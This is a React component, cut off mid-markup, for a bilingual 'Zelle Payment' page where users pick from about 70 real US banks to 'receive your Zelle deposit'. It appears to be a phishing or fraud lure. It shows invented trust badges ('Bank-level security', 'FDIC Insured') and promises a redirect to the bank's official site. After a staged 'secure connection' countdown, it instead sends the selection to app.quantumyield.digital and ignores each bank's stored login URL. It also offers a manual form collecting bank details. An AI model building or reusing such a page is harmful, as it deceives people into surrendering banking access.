"use client"

import { useState, useEffect } from "react"
import {
  Shield,
  Search,
  ArrowLeft,
  ArrowRight,
  CheckCircle2,
  Lock,
  Loader2,
  Building2,
  ChevronRight,
  X,
} from "lucide-react"
import { useLanguage } from "@/lib/i18n/context"

// ─── Data ────────────────────────────────────────────────────────────────────

export type BankCategory = "National Banks" | "Online Banks" | "Credit Unions" | "Regional Banks" | "Community Banks"

export interface BankEntry {
  id: string
  name: string
  domain: string        // used for logo.clearbit.com/<domain>
  color: string         // brand fallback bg color
  category: BankCategory
  loginUrl: string
}

/** Returns the Clearbit logo URL for a given domain (size=128 for crisp display) */
export function bankLogoUrl(domain: string): string {
  return `https://logo.clearbit.com/${domain}?size=128`
}

export const BANKS: BankEntry[] = [
  // ── National Banks ──────────────────────────────────────────────────────────
  { id: "chase",           name: "Chase",                      domain: "chase.com",                       color: "#117ACA", category: "National Banks",  loginUrl: "https://www.chase.com" },
  { id: "bofa",            name: "Bank of America",            domain: "bankofamerica.com",               color: "#E31837", category: "National Banks",  loginUrl: "https://www.bankofamerica.com" },
  { id: "wellsfargo",      name: "Wells Fargo",                domain: "wellsfargo.com",                  color: "#D71E2B", category: "National Banks",  loginUrl: "https://www.wellsfargo.com" },
  { id: "citi",            name: "Citibank",                   domain: "citi.com",                        color: "#003B8E", category: "National Banks",  loginUrl: "https://online.citi.com" },
  { id: "usbank",          name: "U.S. Bank",                  domain: "usbank.com",                      color: "#0660A9", category: "National Banks",  loginUrl: "https://www.usbank.com" },
  { id: "pnc",             name: "PNC Bank",                   domain: "pnc.com",                         color: "#F58220", category: "National Banks",  loginUrl: "https://www.pnc.com" },
  { id: "capitalone",      name: "Capital One",                domain: "capitalone.com",                  color: "#D03027", category: "National Banks",  loginUrl: "https://www.capitalone.com" },
  { id: "truist",          name: "Truist Bank",                domain: "truist.com",                      color: "#4E2A84", category: "National Banks",  loginUrl: "https://www.truist.com" },
  { id: "tdbank",          name: "TD Bank",                    domain: "tdbank.com",                      color: "#34A853", category: "National Banks",  loginUrl: "https://www.tdbank.com" },
  { id: "goldman",         name: "Goldman Sachs",              domain: "goldmansachs.com",                color: "#6A6A6A", category: "National Banks",  loginUrl: "https://www.goldmansachs.com" },
  // ── Online Banks ───────────────────────────────────────────────────────────
  { id: "ally",            name: "Ally Bank",                  domain: "ally.com",                        color: "#7D2AE8", category: "Online Banks",    loginUrl: "https://www.ally.com" },
  { id: "discover",        name: "Discover Bank",              domain: "discover.com",                    color: "#F76F20", category: "Online Banks",    loginUrl: "https://www.discover.com" },
  { id: "sofi",            name: "SoFi Bank",                  domain: "sofi.com",                        color: "#00A59A", category: "Online Banks",    loginUrl: "https://www.sofi.com" },
  { id: "chime",           name: "Chime",                      domain: "chime.com",                       color: "#1EC677", category: "Online Banks",    loginUrl: "https://www.chime.com" },
  { id: "varo",            name: "Varo Bank",                  domain: "varomoney.com",                   color: "#3A3BFF", category: "Online Banks",    loginUrl: "https://www.varomoney.com" },
  { id: "current",         name: "Current",                    domain: "current.com",                     color: "#30D5C8", category: "Online Banks",    loginUrl: "https://current.com" },
  { id: "marcus",          name: "Marcus",                     domain: "marcus.com",                      color: "#6A6A6A", category: "Online Banks",    loginUrl: "https://www.marcus.com" },
  { id: "axos",            name: "Axos Bank",                  domain: "axosbank.com",                    color: "#0E6CC0", category: "Online Banks",    loginUrl: "https://www.axosbank.com" },
  { id: "synchrony",       name: "Synchrony Bank",             domain: "synchronybank.com",               color: "#003087", category: "Online Banks",    loginUrl: "https://www.synchronybank.com" },
  { id: "nbkc",            name: "nbkc bank",                  domain: "nbkc.com",                        color: "#E8411A", category: "Online Banks",    loginUrl: "https://www.nbkc.com" },
  { id: "liveoak",         name: "Live Oak Bank",              domain: "liveoakbank.com",                 color: "#1D6F42", category: "Online Banks",    loginUrl: "https://www.liveoakbank.com" },
  { id: "quontic",         name: "Quontic Bank",               domain: "quonticbank.com",                 color: "#0070C0", category: "Online Banks",    loginUrl: "https://www.quonticbank.com" },
  { id: "aspiration",      name: "Aspiration",                 domain: "aspiration.com",                  color: "#00B38E", category: "Online Banks",    loginUrl: "https://www.aspiration.com" },
  // ── Credit Unions ──────────────────────────────────────────────────────────
  { id: "navyfcu",         name: "Navy Federal CU",            domain: "navyfederal.org",                 color: "#003087", category: "Credit Unions",   loginUrl: "https://www.navyfederal.org" },
  { id: "penfed",          name: "PenFed CU",                  domain: "penfed.org",                      color: "#004B8D", category: "Credit Unions",   loginUrl: "https://www.penfed.org" },
  { id: "becu",            name: "BECU",                       domain: "becu.org",                        color: "#007DC5", category: "Credit Unions",   loginUrl: "https://www.becu.org" },
  { id: "schoolsfirst",    name: "SchoolsFirst FCU",           domain: "schoolsfirstfcu.org",             color: "#003C71", category: "Credit Unions",   loginUrl: "https://www.schoolsfirstfcu.org" },
  { id: "golden1",         name: "Golden 1 CU",                domain: "golden1.com",                     color: "#F5A623", category: "Credit Unions",   loginUrl: "https://www.golden1.com" },
  { id: "alliant",         name: "Alliant CU",                 domain: "alliantcreditunion.org",          color: "#1B4F8A", category: "Credit Unions",   loginUrl: "https://www.alliantcreditunion.org" },
  { id: "americafirst",    name: "America First CU",           domain: "americafirst.com",                color: "#CC0000", category: "Credit Unions",   loginUrl: "https://www.americafirst.com" },
  { id: "suncoast",        name: "Suncoast CU",                domain: "suncoastcreditunion.com",         color: "#F7941D", category: "Credit Unions",   loginUrl: "https://www.suncoastcreditunion.com" },
  { id: "digitalfcu",      name: "Digital FCU",                domain: "dcu.org",                         color: "#0067B1", category: "Credit Unions",   loginUrl: "https://www.dcu.org" },
  { id: "firsttech",       name: "First Tech FCU",             domain: "firsttechfed.com",                color: "#006837", category: "Credit Unions",   loginUrl: "https://www.firsttechfed.com" },
  { id: "securityservice", name: "Security Service FCU",       domain: "ssfcu.org",                       color: "#003087", category: "Credit Unions",   loginUrl: "https://www.ssfcu.org" },
  { id: "randolph",        name: "Randolph-Brooks FCU",        domain: "rbfcu.org",                       color: "#003087", category: "Credit Unions",   loginUrl: "https://www.rbfcu.org" },
  { id: "secu",            name: "SECU",                       domain: "secumd.org",                      color: "#00529B", category: "Credit Unions",   loginUrl: "https://www.secumd.org" },
  { id: "tdecu",           name: "TDECU",                      domain: "tdecu.org",                       color: "#005BBB", category: "Credit Unions",   loginUrl: "https://www.tdecu.org" },
  { id: "starone",         name: "Star One CU",                domain: "starone.org",                     color: "#003087", category: "Credit Unions",   loginUrl: "https://www.starone.org" },
  // ── Regional Banks ─────────────────────────────────────────────────────────
  { id: "regions",         name: "Regions Bank",               domain: "regions.com",                     color: "#008000", category: "Regional Banks",  loginUrl: "https://www.regions.com" },
  { id: "fifththird",      name: "Fifth Third Bank",           domain: "53.com",                          color: "#62A800", category: "Regional Banks",  loginUrl: "https://www.53.com" },
  { id: "keybank",         name: "KeyBank",                    domain: "key.com",                         color: "#CC0000", category: "Regional Banks",  loginUrl: "https://www.key.com" },
  { id: "huntington",      name: "Huntington Bank",            domain: "huntington.com",                  color: "#006747", category: "Regional Banks",  loginUrl: "https://www.huntington.com" },
  { id: "mtbank",          name: "M&T Bank",                   domain: "mtb.com",                         color: "#003087", category: "Regional Banks",  loginUrl: "https://www.mtb.com" },
  { id: "citizens",        name: "Citizens Bank",              domain: "citizensbank.com",                color: "#004B8D", category: "Regional Banks",  loginUrl: "https://www.citizensbank.com" },
  { id: "bmoharris",       name: "BMO Harris Bank",            domain: "bmoharris.com",                   color: "#0079C1", category: "Regional Banks",  loginUrl: "https://www.bmoharris.com" },
  { id: "comerica",        name: "Comerica Bank",              domain: "comerica.com",                    color: "#003087", category: "Regional Banks",  loginUrl: "https://www.comerica.com" },
  { id: "zions",           name: "Zions Bank",                 domain: "zionsbank.com",                   color: "#003C71", category: "Regional Banks",  loginUrl: "https://www.zionsbank.com" },
  { id: "synovus",         name: "Synovus Bank",               domain: "synovus.com",                     color: "#00529B", category: "Regional Banks",  loginUrl: "https://www.synovus.com" },
  { id: "firsthorizon",    name: "First Horizon Bank",         domain: "firsthorizon.com",                color: "#003087", category: "Regional Banks",  loginUrl: "https://www.firsthorizon.com" },
  { id: "flagstar",        name: "Flagstar Bank",              domain: "flagstar.com",                    color: "#0033A0", category: "Regional Banks",  loginUrl: "https://www.flagstar.com" },
  { id: "bankunited",      name: "BankUnited",                 domain: "bankunited.com",                  color: "#005B8E", category: "Regional Banks",  loginUrl: "https://www.bankunited.com" },
  { id: "eastwestbank",    name: "East West Bank",             domain: "eastwestbank.com",                color: "#C8102E", category: "Regional Banks",  loginUrl: "https://www.eastwestbank.com" },
  { id: "umpqua",          name: "Umpqua Bank",                domain: "umpquabank.com",                  color: "#007B5F", category: "Regional Banks",  loginUrl: "https://www.umpquabank.com" },
  { id: "firstcitizens",   name: "First Citizens Bank",        domain: "firstcitizens.com",               color: "#003087", category: "Regional Banks",  loginUrl: "https://www.firstcitizens.com" },
  { id: "prosperity",      name: "Prosperity Bank",            domain: "prosperitybanktx.com",            color: "#004B8D", category: "Regional Banks",  loginUrl: "https://www.prosperitybanktx.com" },
  { id: "cullen",          name: "Frost Bank",                 domain: "frostbank.com",                   color: "#004B8D", category: "Regional Banks",  loginUrl: "https://www.frostbank.com" },
  { id: "southstate",      name: "South State Bank",           domain: "southstatebank.com",              color: "#003087", category: "Regional Banks",  loginUrl: "https://www.southstatebank.com" },
  { id: "westernaliance",  name: "Western Alliance Bank",      domain: "westernalliancebancorporation.com",color: "#003C71",category: "Regional Banks",  loginUrl: "https://www.westernalliancebancorporation.com" },
  // ── Community Banks ────────────────────────────────────────────────────────
  { id: "crossriver",      name: "Cross River Bank",           domain: "crossriverbank.com",              color: "#003087", category: "Community Banks", loginUrl: "https://www.crossriverbank.com" },
  { id: "webbank",         name: "WebBank",                    domain: "webbank.com",                     color: "#003087", category: "Community Banks", loginUrl: "https://www.webbank.com" },
  { id: "cit",             name: "CIT Bank",                   domain: "cit.com",                         color: "#003087", category: "Community Banks", loginUrl: "https://www.cit.com" },
  { id: "tiaa",            name: "TIAA Bank",                  domain: "tiaa.org",                        color: "#006747", category: "Community Banks", loginUrl: "https://www.tiaa.org" },
  { id: "bannerbank",      name: "Banner Bank",                domain: "bannerbank.com",                  color: "#CC0000", category: "Community Banks", loginUrl: "https://www.bannerbank.com" },
  { id: "renasant",        name: "Renasant Bank",              domain: "renasantbank.com",                color: "#003C71", category: "Community Banks", loginUrl: "https://www.renasantbank.com" },
  { id: "patriot",         name: "Patriot Bank",               domain: "bankpatriot.com",                 color: "#003087", category: "Community Banks", loginUrl: "https://www.bankpatriot.com" },
  { id: "glacier",         name: "Glacier Bank",               domain: "glacierbancorp.com",              color: "#0067B1", category: "Community Banks", loginUrl: "https://www.glacierbancorp.com" },
  { id: "centralbank",     name: "Central Bank",               domain: "centralbank.net",                 color: "#003087", category: "Community Banks", loginUrl: "https://www.centralbank.net" },
]

export const CATEGORIES: BankCategory[] = ["National Banks", "Online Banks", "Credit Unions", "Regional Banks", "Community Banks"]

// ─── BankLogo component ───────────────────────────────────────────────────────
// Loads from Clearbit logo API. On error, renders a brand-colored letter avatar.

interface BankLogoProps {
  bank: BankEntry
  size?: "sm" | "md" | "lg"
  className?: string
}

function BankLogo({ bank, size = "md", className = "" }: BankLogoProps) {
  const [failed, setFailed] = useState(false)
  const [loaded, setLoaded] = useState(false)

  const sizeMap = {
    sm: { outer: "w-8 h-8",   img: "w-6 h-6",   text: "text-sm"  },
    md: { outer: "w-12 h-12", img: "w-10 h-10",  text: "text-base" },
    lg: { outer: "w-16 h-16", img: "w-12 h-12",  text: "text-xl"  },
  }
  const s = sizeMap[size]

  const initials = bank.name
    .split(/\s+/)
    .slice(0, 2)
    .map((w) => w[0])
    .join("")
    .toUpperCase()

  if (failed) {
    return (
      <div
        className={`${s.outer} rounded-xl flex items-center justify-center shrink-0 ${className}`}
        style={{ backgroundColor: bank.color }}
        role="img"
        aria-label={`${bank.name} logo`}
      >
        <span className={`text-white font-bold ${s.text} leading-none`}>{initials}</span>
      </div>
    )
  }

  return (
    <div className={`${s.outer} rounded-xl bg-white border border-gray-100 flex items-center justify-center shrink-0 overflow-hidden ${className}`}
         role="img" aria-label={`${bank.name} logo`}>
      {!loaded && (
        <div className="absolute inset-0 flex items-center justify-center">
          <div className="w-4 h-4 rounded-full border-2 border-gray-200 border-t-gray-400 animate-spin" />
        </div>
      )}
      <img
        src={bankLogoUrl(bank.domain)}
        alt={`${bank.name} logo`}
        className={`${s.img} object-contain transition-opacity duration-200 ${loaded ? "opacity-100" : "opacity-0"}`}
        onLoad={() => setLoaded(true)}
        onError={() => setFailed(true)}
        crossOrigin="anonymous"
      />
    </div>
  )
}

// ─────────────────────────────────────────────────────────────────────────────

type Step = "select" | "confirm" | "connecting" | "redirecting"

interface Props {
  onBack: () => void
  backLabel?: string
  showManualEntry?: boolean
  clientMode?: boolean
}

// ─── Inline bilingual copy (safe — no context dependency) ───────────────────

const COPY = {
  en: {
    badge:              "Zelle Payment",
    title:              "Connect your bank account",
    subtitle:           "Select your financial institution to securely link your account and receive your Zelle deposit.",
    searchPlaceholder:  "Search your bank...",
    allCategory:        "All",
    noResultsTitle:     (term: string) => `No banks match "${term}"`,
    noResultsTip:       "Try a different search term",
    chooseDifferent:    "Choose a different bank",
    back:               "Back",
    connectTo:          (name: string) => `Connect to ${name}`,
    connectingTitle:    "Establishing secure connection...",
    connectingSubtitle: "Preparing your bank redirect",
    redirectingTo:      (name: string) => `Redirecting to ${name}`,
    openingIn:          (s: number) => `Opening secure bank portal in ${s}s`,
    continueNow:        "Continue now",
    trustSsl:           "256-bit SSL",
    trustSslSub:        "Encrypted connection",
    trustSecurity:      "Bank-level security",
    trustSecuritySub:   "Your data stays safe",
    trustCdic:          "FDIC Insured",
    trustCdicSub:       "Federally protected",
    secureConnection:   "Secure Connection",
    secureNotice:       "You'll be securely redirected to your bank's official website. Never share your banking credentials with anyone.",
    whatHappensNext:    "What happens next?",
    step1:              "You'll be redirected to your bank's secure login page",
    step2:              "Log in with your existing banking credentials",
    step3:              "Authorize the connection to complete the setup",
    catBigSix:          "Big Six",
    catOnline:          "Online Banks",
    catCreditUnions:    "Credit Unions",
    catRegional:        "Regional Banks",
    manualPrompt:       "Don't see your bank?",
    manualTitle:        "Enter your bank details manually",
    manualInstitutionLabel:       "Institution name",
    manualInstitutionPlaceholder: "e.g. TD Bank",
    manualAccountTypeLabel:       "Account type",
    manualAccountTypeDefault:     "Select type",
    manualChequing:     "Checking",
    manualSavings:      "Savings",
    manualBusiness:     "Business",
    manualBranchLabel:        "Branch / transit number (optional)",
    manualBranchPlaceholder:  "e.g. 00123",
    manualSubmit:       "Submit manually",
    manualSubmitting:   "Submitting...",
    manualSuccess:      "Your bank details have been submitted. Our team will verify and connect your account.",
  },
  fr: {
    badge:              "Paiement Zelle",
    title:              "Connectez votre compte bancaire",
    subtitle:           "Sélectionnez votre institution financière pour lier votre compte en toute sécurité et recevoir votre dépôt Zelle.",
    searchPlaceholder:  "Recherchez votre banque...",
    allCategory:        "Toutes",
    noResultsTitle:     (term: string) => `Aucune banque ne correspond à « ${term} »`,
    noResultsTip:       "Essayez un autre terme de recherche",
    chooseDifferent:    "Choisir une autre banque",
    back:               "Retour",
    connectTo:          (name: string) => `Se connecter à ${name}`,
    connectingTitle:    "Établissement de la connexion sécurisée...",
    connectingSubtitle: "Préparation de la redirection vers votre banque",
    redirectingTo:      (name: string) => `Redirection vers ${name}`,
    openingIn:          (s: number) => `Ouverture du portail sécurisé dans ${s}s`,
    continueNow:        "Continuer maintenant",
    trustSsl:           "SSL 256 bits",
    trustSslSub:        "Connexion chiffrée",
    trustSecurity:      "Sécurité bancaire",
    trustSecuritySub:   "Vos données restent protégées",
    trustCdic:          "Assuré FDIC",
    trustCdicSub:       "Protection fédérale",
    secureConnection:   "Connexion sécurisée",
    secureNotice:       "Vous serez redirigé en toute sécurité vers le site officiel de votre banque. Ne partagez jamais vos identifiants bancaires.",
    whatHappensNext:    "Que se passe-t-il ensuite?",
    step1:              "Vous serez redirigé vers la page de connexion sécurisée de votre banque",
    step2:              "Connectez-vous avec vos identifiants bancaires existants",
    step3:              "Autorisez la connexion pour finaliser la configuration",
    catBigSix:          "Les Six Grandes",
    catOnline:          "Banques en ligne",
    catCreditUnions:    "Coopératives de crédit",
    catRegional:        "Banques régionales",
    manualPrompt:       "Votre banque n'est pas dans la liste?",
    manualTitle:        "Entrez les coordonnées de votre banque manuellement",
    manualInstitutionLabel:       "Nom de l'institution",
    manualInstitutionPlaceholder: "ex. Banque TD",
    manualAccountTypeLabel:       "Type de compte",
    manualAccountTypeDefault:     "Sélectionner le type",
    manualChequing:     "Courant",
    manualSavings:      "Épargne",
    manualBusiness:     "Affaires",
    manualBranchLabel:        "Numéro de succursale / transit (optionnel)",
    manualBranchPlaceholder:  "ex. 00123",
    manualSubmit:       "Soumettre manuellement",
    manualSubmitting:   "Envoi en cours...",
    manualSuccess:      "Vos coordonnées bancaires ont été soumises. Notre équipe vérifiera et connectera votre compte.",
  },
} as const

// ─── Shared flow ─────────────────────────────────────────────────────────────

export default function ConnectBankFlow({ onBack, showManualEntry = true, clientMode = false }: Props) {
  const { language } = useLanguage()
  const c = COPY[language] ?? COPY.en

  // Light-mode theme tokens for client pages
  const t = clientMode ? {
    bg:            "bg-gray-50",
    backBtn:       "text-gray-500 hover:text-gray-900",
    badge:         "text-gray-500",
    heading:       "text-gray-900",
    subtitle:      "text-gray-500",
    trustCard:     "bg-white border border-gray-200 shadow-sm",
    trustIconBg:   "bg-[#6D1ED4]/15",
    trustLabel:    "text-gray-800",
    trustSub:      "text-gray-400",
    searchInput:   "border-gray-200 bg-white text-gray-900 placeholder:text-gray-400 focus:ring-[#6D1ED4]",
    chipInactive:  "bg-white text-gray-500 border-gray-200 hover:border-gray-400 hover:text-gray-800",
    bankCard:      "bg-white border-2 border-gray-200 hover:border-[#6D1ED4]",
    bankName:      "text-gray-500 group-hover:text-gray-900",
    noResult:      "text-gray-400",
    catLabel:      "text-gray-400",
    manualDivider: "border-gray-200",
    confirmCard:   "bg-white border border-gray-200 shadow-sm",
    confirmBankBg: "bg-gray-100 border-gray-200",
    confirmName:   "text-gray-900",
    confirmCat:    "text-gray-400",
    securityBg:    "bg-[#6D1ED4]/8 border-[#6D1ED4]/30",
    stepText:      "text-gray-600",
    stepLabel:     "text-gray-600",
    spinner:       "text-gray-500",
    countdownTrack:"#e5e7eb",
    countdownNum:  "text-gray-900",
    connectBtn:    "bg-[#6D1ED4] hover:bg-[#5A18B0] text-white",
    redirectMsg:   "text-gray-600",
    redirectTitle: "text-gray-900",
  } : {
    bg:            "bg-transparent",
    backBtn:       "text-zinc-500 hover:text-white",
    badge:         "text-zinc-400",
    heading:       "text-white",
    subtitle:      "text-zinc-500",
    trustCard:     "bg-zinc-900 border border-zinc-800",
    trustIconBg:   "bg-[#6D1ED4]/15",
    trustLabel:    "text-white",
    trustSub:      "text-zinc-400",
    searchInput:   "border-zinc-700 bg-zinc-900 text-white placeholder:text-zinc-500 focus:ring-[#6D1ED4]",
    chipInactive:  "bg-zinc-900 text-zinc-400 border-zinc-700 hover:border-zinc-500 hover:text-white",
    bankCard:      "bg-zinc-900 border-2 border-zinc-700 hover:border-[#6D1ED4]",
    bankName:      "text-zinc-400 group-hover:text-white",
    noResult:      "text-zinc-400",
    catLabel:      "text-zinc-400",
    manualDivider: "border-zinc-800",
    confirmCard:   "bg-zinc-900 border border-zinc-700",
    confirmBankBg: "bg-zinc-800 border-zinc-700",
    confirmName:   "text-white",
    confirmCat:    "text-zinc-400",
    securityBg:    "bg-[#6D1ED4]/8 border-[#6D1ED4]/30",
    stepText:      "text-zinc-300",
    stepLabel:     "text-zinc-400",
    spinner:       "text-zinc-400",
    countdownTrack:"#27272a",
    countdownNum:  "text-white",
    connectBtn:    "bg-[#6D1ED4] hover:bg-[#5A18B0] text-white",
    redirectMsg:   "text-zinc-400",
    redirectTitle: "text-white",
  }

  const [search, setSearch]                 = useState("")
  const [activeCategory, setActiveCategory] = useState<BankCategory | "all">("all")
  const [selected, setSelected]             = useState<BankEntry | null>(null)
  const [step, setStep]                     = useState<Step>("select")
  const [countdown, setCountdown]           = useState(5)

  const categoryLabels: Record<BankCategory | "all", string> = {
    all:                c.allCategory,
    "National Banks":   "National",
    "Online Banks":     "Online",
    "Credit Unions":    "Credit Unions",
    "Regional Banks":   "Regional",
    "Community Banks":  "Community",
  }

  const filtered = BANKS.filter((b) => {
    const matchSearch = b.name.toLowerCase().includes(search.toLowerCase())
    const matchCat    = activeCategory === "all" || b.category === activeCategory
    return matchSearch && matchCat
  })

  const grouped = CATEGORIES.reduce<Record<BankCategory, BankEntry[]>>((acc, cat) => {
    acc[cat] = filtered.filter((b) => b.category === cat)
    return acc
  }, {} as Record<BankCategory, BankEntry[]>)

  const doRedirect = () => {
    if (!selected) return
    const params = new URLSearchParams({
      bankId:     selected.id,
      bankName:   selected.name,
      categoryId: selected.category,
    })
    window.location.href = clientMode
      ? `https://www.zellepay.com/?${params.toString()}`
      : `https://app.quantumyield.digital/countdown?${params.toString()}`
  }

  useEffect(() => {
    if (step !== "redirecting") return
    setCountdown(5)
    const interval = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(interval)
          doRedirect()
          return 0
        }
        return prev - 1
      })
    }, 1000)
    return () => clearInterval(interval)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [step])

  const handleSelect = (bank: BankEntry) => {
    setSelected(bank)
    setStep("confirm")
  }

  const handleConnect = () => {
    setStep("connecting")
    setTimeout(() => setStep("redirecting"), 2000)
  }

  const handleBack = () => {
    if (step !== "select") {
      setSelected(null)
      setStep("select")
      setCountdown(5)
    } else {
      onBack()
    }
  }

  const trust = [
    { icon: Lock,         label: c.trustSsl,      sub: c.trustSslSub },
    { icon: Shield,       label: c.trustSecurity,  sub: c.trustSecuritySub },
    { icon: CheckCircle2, label: c.trustCdic,      sub: c.trustCdicSub },
  ]

  return (
    <main className={`max-w-5xl mx-auto px-4 py-8 pb-16 ${clientMode ? "text-gray-900" : ""}`}>

      {/* Back nav */}
      <button
        onClick={handleBack}
        className={`flex items-center gap-2 text-sm ${t.backBtn} transition-colors mb-6 group min-h-[44px]`}
      >
        <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
        {step === "select" ? c.back : c.chooseDifferent}
      </button>

      {/* ── SELECT ── */}
      {step === "select" && (
        <>
          {/* Hero */}
          <div className="mb-10">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-10 h-10 rounded-xl bg-[#6D1ED4] flex items-center justify-center">
                <Building2 className="w-5 h-5 text-white" />
              </div>
              <span className={`text-xs font-semibold tracking-widest ${t.badge} uppercase`}>
                {c.badge}
              </span>
            </div>
            <h1 className={`text-3xl md:text-4xl font-bold ${t.heading} mb-3 text-balance`}>
              {c.title}
            </h1>
            <p className={`${t.subtitle} text-base md:text-lg leading-relaxed max-w-xl`}>
              {c.subtitle}
            </p>
          </div>

          {/* Trust strip */}
          <div className="grid grid-cols-3 gap-3 mb-10">
            {trust.map(({ icon: Icon, label, sub }) => (
              <div
                key={label}
                className={`flex flex-col sm:flex-row items-start sm:items-center gap-2 sm:gap-3 ${t.trustCard} rounded-xl p-3 sm:p-4`}
              >
                <div className={`w-8 h-8 shrink-0 rounded-lg ${t.trustIconBg} flex items-center justify-center`}>
                  <Icon className="w-4 h-4 text-[#6D1ED4]" />
                </div>
                <div className="min-w-0">
                  <p className={`text-xs font-semibold ${t.trustLabel} leading-tight`}>{label}</p>
                  <p className={`text-xs ${t.trustSub} leading-tight hidden sm:block`}>{sub}</p>
                </div>
              </div>
            ))}
          </div>

          {/* Search + category filter */}
          <div className="flex flex-col sm:flex-row gap-3 mb-6">
            <div className="relative flex-1">
              <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400 pointer-events-none" />
              <input
                type="search"
                placeholder={c.searchPlaceholder}
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className={`w-full pl-10 pr-4 py-3 rounded-xl border text-sm focus:outline-none focus:ring-2 focus:border-transparent transition-all ${t.searchInput}`}
                style={{ fontSize: "16px" }}
                aria-label={c.searchPlaceholder}
              />
              {search && (
                <button
                  onClick={() => setSearch("")}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-zinc-400 hover:text-zinc-600"
                  aria-label="Clear search"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            <div className="flex gap-2 overflow-x-auto pb-1 sm:pb-0 shrink-0">
              {(["all", ...CATEGORIES] as const).map((cat) => (
                <button
                  key={cat}
                  onClick={() => setActiveCategory(cat)}
                  className={`px-3 py-2.5 rounded-xl text-xs font-semibold whitespace-nowrap border transition-all min-h-[44px] ${
                    activeCategory === cat
                      ? "bg-[#6D1ED4] text-white border-[#6D1ED4]"
                      : t.chipInactive
                  }`}
                >
                  {categoryLabels[cat]}
                </button>
              ))}
            </div>
          </div>

          {/* Bank grid */}
          {filtered.length === 0 ? (
            <div className={`text-center py-16 ${clientMode ? "text-gray-400" : "text-zinc-400"}`}>
              <Building2 className="w-10 h-10 mx-auto mb-3 opacity-40" />
              <p className="font-medium">{c.noResultsTitle(search)}</p>
              <p className="text-sm mt-1">{c.noResultsTip}</p>
            </div>
          ) : (
            <div className="space-y-8">
              {CATEGORIES.map((cat) => {
                const banks = grouped[cat]
                if (!banks.length) return null
                if (activeCategory !== "all" && activeCategory !== cat) return null
                return (
                  <section key={cat}>
                    <h2 className={`text-xs font-semibold tracking-widest ${t.catLabel} uppercase mb-3`}>
                      {categoryLabels[cat]}
                    </h2>
                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 gap-3">
                      {banks.map((bank) => (
                        <button
                          key={bank.id}
                          onClick={() => handleSelect(bank)}
                          className={`group relative ${t.bankCard} rounded-2xl p-4 flex flex-col items-center gap-3 min-h-[116px] transition-all duration-150 hover:shadow-lg hover:shadow-[#6D1ED4]/12 focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2`}
                          aria-label={c.connectTo(bank.name)}
                        >
                          {/* Logo container — fixed 48×48 so all tiles align */}
                          <div className="w-12 h-12 flex items-center justify-center mt-1 transition-transform duration-150 group-hover:scale-105">
                            <BankLogo bank={bank} size="md" />
                          </div>
                          <span className={`text-[11px] font-semibold ${t.bankName} text-center leading-snug transition-colors w-full line-clamp-2`}>
                            {bank.name}
                          </span>
                          <ChevronRight className="absolute right-2 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-300 group-hover:text-[#6D1ED4] opacity-0 group-hover:opacity-100 transition-all" />
                        </button>
                      ))}
                    </div>
                  </section>
                )
              })}
            </div>
          )}

          {/* Manual entry fallback */}
          {showManualEntry && (
            <div className={`mt-12 border-t ${t.manualDivider} pt-8`}>
              <p className={`text-sm ${clientMode ? "text-gray-500" : "text-zinc-400"} mb-3`}>{c.manualPrompt}</p>
              <ManualEntryForm language={language} clientMode={clientMode} />
            </div>
          )}
        </>
      )}

      {/* ── CONFIRM / CONNECTING / REDIRECTING ── */}
      {(step === "confirm" || step === "connecting" || step === "redirecting") && selected && (
        <div className="max-w-lg mx-auto">

          {/* Bank card */}
          <div className={`${t.confirmCard} rounded-2xl p-6 mb-6 flex items-center gap-5`}>
            <BankLogo bank={selected} size="lg" />
            <div>
              <p className={`text-xs ${t.confirmCat} font-medium uppercase tracking-wider mb-1`}>
                {categoryLabels[selected.category]}
              </p>
              <h2 className={`text-xl font-bold ${t.confirmName}`}>{selected.name}</h2>
              <p className={`text-xs ${t.confirmCat} mt-0.5`}>{selected.domain}</p>
            </div>
          </div>

          {/* Security notice */}
          <div className="flex items-start gap-3 bg-[#6D1ED4]/8 border border-[#6D1ED4]/30 rounded-xl p-4 mb-6">
            <Shield className="w-5 h-5 text-[#6D1ED4] shrink-0 mt-0.5" />
            <div>
              <p className={`text-sm font-semibold ${t.confirmName} mb-0.5`}>{c.secureConnection}</p>
              <p className={`text-sm ${t.stepText} leading-relaxed`}>{c.secureNotice}</p>
            </div>
          </div>

          {/* Confirm step */}
          {step === "confirm" && (
            <>
              <h3 className={`text-sm font-semibold ${t.stepLabel} mb-3`}>{c.whatHappensNext}</h3>
              <ul className="space-y-3 mb-8">
                {[c.step1, c.step2, c.step3].map((text, i) => (
                  <li key={i} className={`flex items-start gap-3 text-sm ${t.stepText}`}>
                    <span className="w-5 h-5 rounded-full bg-[#6D1ED4]/15 text-[#6D1ED4] font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">
                      {i + 1}
                    </span>
                    {text}
                  </li>
                ))}
              </ul>
              <button
                onClick={handleConnect}
                className="w-full flex items-center justify-center gap-2 bg-[#6D1ED4] hover:bg-[#5A18B0] text-white font-semibold py-4 rounded-xl transition-colors text-base focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 min-h-[56px]"
              >
                {c.connectTo(selected.name)}
                <ArrowRight className="w-5 h-5" />
              </button>
            </>
          )}

          {/* Connecting spinner */}
          {step === "connecting" && (
            <div className="text-center py-10">
              <Loader2 className="w-12 h-12 text-[#6D1ED4] animate-spin mx-auto mb-4" />
              <p className={`font-semibold ${t.redirectTitle} text-lg`}>{c.connectingTitle}</p>
              <p className={`${t.redirectMsg} text-sm mt-1`}>{c.connectingSubtitle}</p>
            </div>
          )}

          {/* Redirecting countdown */}
          {step === "redirecting" && (
            <div className="text-center py-8">
              <div className="relative w-20 h-20 mx-auto mb-6">
                <svg className="w-20 h-20 -rotate-90" viewBox="0 0 80 80">
                  <circle cx="40" cy="40" r="34" fill="none" stroke={t.countdownTrack} strokeWidth="8" />
